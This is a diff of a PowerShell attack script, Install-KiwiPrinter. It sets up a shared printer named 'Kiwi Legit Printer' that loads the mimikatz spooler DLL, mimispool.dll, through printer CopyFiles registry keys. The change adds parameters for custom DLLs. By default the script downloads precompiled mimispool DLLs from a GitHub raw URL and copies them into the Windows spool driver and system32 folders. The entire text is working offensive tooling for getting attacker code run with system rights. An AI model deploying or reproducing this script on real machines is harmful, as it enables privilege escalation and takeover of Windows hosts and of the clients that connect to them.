@@ -1,27 +1,35 @@
 function Install-KiwiPrinter {
 
     param (
-        [Parameter(Mandatory=$false, HelpMessage="Path to the mimikatz_trunk.zip archive.")]
-        [String]$Archive
+        [Parameter(Mandatory=$false, HelpMessage="Path to the custom 32-bit DLL.")]
+        [String]$DLL32,
+
+        [Parameter(Mandatory=$false, HelpMessage="Path to the custom 64-bit DLL.")]
+        [String]$DLL64
     )
 
     $printerName     = 'Kiwi Legit Printer'
     $system32        = $env:systemroot + '\system32'
     $drivers         = $system32 + '\spool\drivers'
     $RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\' + $printerName
+    $tmpFolder       = '.\tmp'
 
-    if ( ! $Archive ) {
-        Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip' -OutFile '.\mimikatz_trunk.zip'
-        $mimikatzPath = '.\mimikatz_trunk'
+    if ( $DLL32 -And $DLL64 ) {
+        Copy-Item -Force -Path $DLL64   -Destination ($drivers  + '\x64\3\mimispool.dll')
+        Copy-Item -Force -Path $DLL32 -Destination ($drivers  + '\W32X86\3\mimispool.dll')
     } else {
-        $mimikatzPath = $Archive
+        New-Item -Path $tmpFolder -ItemType "Directory" -Force | Out-Null
+
+        $DLL32 = "$tmpFolder\mimispool32.dll"
+        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/xbufu/Mimispool/main/dll/mimispool32.dll' -OutFile $DLL32
+
+        $DLL64 = "$tmpFolder\mimispool64.dll"
+        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/xbufu/Mimispool/main/dll/mimispool64.dll' -OutFile $DLL64
     }
 
-    Expand-Archive -Path $mimikatzPath -DestinationPath '.\mimikatz_trunk'
-
     Copy-Item -Force -Path ($system32 + '\mscms.dll')             -Destination ($system32 + '\mimispool.dll')
-    Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
-    Copy-Item -Force -Path '.\mimikatz_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')
+    Copy-Item -Force -Path $DLL64   -Destination ($drivers  + '\x64\3\mimispool.dll')
+    Copy-Item -Force -Path $DLL32 -Destination ($drivers  + '\W32X86\3\mimispool.dll')
 
     Add-PrinterDriver -Name       'Generic / Text Only'
     Add-Printer       -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared
@@ -43,8 +51,9 @@ function Install-KiwiPrinter {
     New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Files'     -PropertyType 'MultiString' -Value $null             | Out-Null
     New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Module'    -PropertyType 'String'      -Value 'mimispool.dll'   | Out-Null
 
-    Remove-Item -Recurse '.\mimikatz_trunk'
-    Remove-Item '.\mimikatz_trunk.zip'
+    if ( Test-Path -Path $tmpFolder ) {
+        Remove-Item -Recurse -Force $tmpFolder
+    }
 }
 
 function Uninstall-KiwiPrinter {
